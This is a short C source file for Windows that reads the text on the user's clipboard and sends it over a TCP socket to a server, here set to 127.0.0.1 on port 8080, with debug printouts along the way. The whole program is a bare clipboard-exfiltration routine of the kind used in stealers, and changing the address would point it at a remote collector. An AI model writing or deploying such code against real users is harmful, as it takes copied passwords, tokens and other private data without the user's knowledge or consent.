#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

HANDLE getData();

int main() {
    if (OpenClipboard(NULL) == 0)
        puts("No such luck!");
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char *clipboard;

    puts("Starting Winsock..");
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
        puts("ERR, :(");
    puts("Started!");
    
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        puts("failed");
    puts("Socket init!");

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {
        puts("No such luck!");
        return 1;
    }

    puts("CONNECTED");

    clipboard = (char *) getData();
    puts(clipboard);
    if (send(s, clipboard, strlen(clipboard), 0) < 0)
        puts("send failed");
    puts("data sent!");
    return 0;
}

HANDLE getData() {
    return GetClipboardData(CF_TEXT);
}
